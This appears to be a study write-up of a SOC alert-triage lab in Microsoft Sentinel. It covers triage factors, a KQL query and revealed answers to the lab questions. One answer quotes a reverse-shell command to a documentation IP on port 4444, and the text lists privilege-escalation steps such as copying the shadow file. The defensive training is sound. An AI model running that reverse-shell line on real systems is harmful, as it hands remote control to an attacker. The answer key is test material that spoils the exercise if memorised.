# **SOC Alert Triaging – Technical Notes**

# **Task 1 – Introduction**

Modern SOCs face high alert volume from cloud environments, endpoints, identity platforms, and network systems. Not all alerts indicate real attacks—triage is required to separate **noise**, **false positives**, and **true malicious activity**.

## **Learning Objectives**

- Understand alert triage & prioritization
- Use Microsoft Sentinel to analyse alerts
- Correlate logs to identify attacker activity & produce verdicts

---

# **Task 2 – Alert Triaging Primer**

## **Why Triaging Matters**

When alerts surge, analysts must rapidly determine:

- What needs immediate action
- What needs investigation
- What can be safely ignored

This prevents resource overload and ensures real attacks are not missed.

---

## **Key Triage Factors**

### **1. Severity Level**

Indicates urgency and potential business impact.

### **2. Timestamp & Frequency**

Shows when alerts occurred and whether activity is ongoing.

### **3. Attack Stage (MITRE ATT&CK alignment)**

Place alerts into lifecycle stages:

- Reconnaissance
- Initial Access
- Persistence
- Privilege Escalation
- Lateral Movement
- Exfiltration

### **4. Affected Asset**

Critical servers, privileged accounts, high-value targets.

A structured triage approach:

| Dimension    | Question              |
| ------------ | --------------------- |
| **Severity** | How bad is it?        |
| **Time**     | When did it happen?   |
| **Context**  | What stage of attack? |
| **Impact**   | Who/what is affected? |

---

## **Deep-Dive Investigation Process**

1. Investigate alert details
2. Check relevant logs
3. Correlate related alerts
4. Build context & timeline
5. Decide next actions
6. Document findings

---

# **Task 3 – Environment Review**

### **Microsoft Sentinel Setup**

1. Azure Portal → Microsoft Sentinel
2. Select instance
3. Logs → Syslog_CL
4. Confirm data is collected

---

# **Alert Walkthrough – Sentinel SOC Workflow**

## **Incident Overview**

Sentinel contains:

- High-severity alerts
- Medium-severity alerts

SOC teams prioritize **high-severity** alerts.

---

## **Example High-Severity Alert: Linux PrivEsc – Kernel Module Insertion**

Initial observations:

- 3 related events
- 3 entities involved
- Categorized as **Privilege Escalation**

Viewing details provides:

- Timeline
- Similar incidents
- Affected assets

---

## **Understanding Linked Alerts**

| Alert                               | Meaning                      |
| ----------------------------------- | ---------------------------- |
| **Root SSH Login from External IP** | Initial Access               |
| **SUID Discovery**                  | Privilege Escalation attempt |
| **Kernel Module Insertion**         | Persistence                  |

Linked alerts often indicate **a full attack chain**.

---

# **Questions (Task 3)**

### **How many entities are affected by the Linux PrivEsc – Polkit Exploit Attempt alert?**

<details>
  <summary>Click to reveal the answer</summary>

**10**

</details>

---

### **Severity of the Linux PrivEsc – Sudo Shadow Access alert?**

<details>
  <summary>Click to reveal the answer</summary>

**High**

</details>

---

### **How many accounts were added to sudoers group in the User Added to Sudo Group alert?**

[Screen record answers](https://youtu.be/OCOLMzzK02w)

<details>
  <summary>Click to reveal the answer</summary>

**4**

</details>

---

# **Task 5 – Diving Deeper Into Logs**

## **Evidence Review**

Under **Events**:

- Kernel module name
- Installation timestamp

---

## **KQL Log Analysis**

```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

### **Observed Suspicious Events**

- `cp` used to copy shadow file
- User **Alice** added to sudoers
- `backupuser` modified
- `malicious_mod.ko` inserted
- Successful SSH login as **root**

Indicates **privilege escalation** + **persistence** activity.

---

# **Task 5 Questions**

### **Kernel module installed in websrv-01?**

[Screen record answers](https://youtu.be/8FAs7lHumvQ)

<details>
  <summary>Click to reveal the answer</summary>

**malicious_mod.ko**

</details>

---

### **Unusual command executed by ops user on websrv-01?**

[Screen record answers](https://youtu.be/3piVUg066_4)

<details>
  <summary>Click to reveal the answer</summary>

**/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1**

</details>

---

### **Source IP of first successful SSH login to storage-01?**

[Screen record answers](https://youtu.be/VrbWThKmHLw)

<details>
  <summary>Click to reveal the answer</summary>

**172.16.0.12**

</details>

---

### **External IP that logged in as root to app-01?**

[Screen record answers](https://youtu.be/QgargLgBdlU)

<details>
  <summary>Click to reveal the answer</summary>

**203.0.113.45**

</details>

---

### **User added to sudoers group on app-01 (besides backupuser)?**

[Screen record answers](https://youtu.be/o2Zd-FTNqk0)

<details>
  <summary>Click to reveal the answer</summary>

**deploy**

</details>

---
